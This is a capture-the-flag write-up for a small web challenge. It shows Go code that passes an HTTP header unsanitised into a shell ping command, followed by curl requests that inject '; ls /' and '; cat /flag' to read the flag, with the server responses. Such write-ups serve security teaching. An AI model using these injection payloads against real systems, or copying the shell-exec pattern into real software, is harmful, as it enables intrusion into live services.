# Description

"Small app, big hole. You know the drill: go break it.
The challenge is accessible with this url."

# Solution

Inside ```index.html``` there's an option to ping another IP thant ours:

```html
<h3>Can I check another IP address than mine?</h3>
<p>Yes, set the HTTP header <code>Inspect-IP</code> with your client</p>
```

And the input is not properly sanitized:

```
func IsItDown(address string) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 200*time.Millisecond)
	defer cancel()

	pingCommand := fmt.Sprintf("ping -c 1 -W 150 %s", address)
	command := exec.CommandContext(ctx, "sh", "-c", pingCommand)
	trace, err := command.Output()
	return string(trace), err
}
```

So adding another command after the ping command argument is possible:

```bash
url -H "Inspect-IP: 8.8.8.8 ; ls /  /flag" https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/is-it-down
{"ip":"8.8.8.8 ; ls /  /flag","down":false,"trace":"PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=53 time=1.48 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.484/1.484/1.484/0.000 ms\n/flag\n\n/:\nbin\ndev\netc\nflag\nhome\nlib\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n"}%
```

```bash
curl -H "Inspect-IP: 8.8.8.8; cat /flag" https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/is-it-down
{"ip":"8.8.8.8; cat  /flag","down":false,"trace":"PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=53 time=1.41 ms\n\n--- 8.8.8.8 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 1.409/1.409/1.409/0.000 ms\nGH19{challenges_for_the_ctf_will_not_be_that_easy}\n"}%
```

It's also possible to strip the IP address completely:

```
curl -H "Inspect-IP: ; cat  /flag" https://0yp0oivpnun7jthof6si6foppfkmlf.challenge.grehack.fr/is-it-down 
{"ip":"; cat  /flag","down":false,"trace":"GH19{challenges_for_the_ctf_will_not_be_that_easy}\n"}
```

flag = ```GH19{challenges_for_the_ctf_will_not_be_that_easy}```
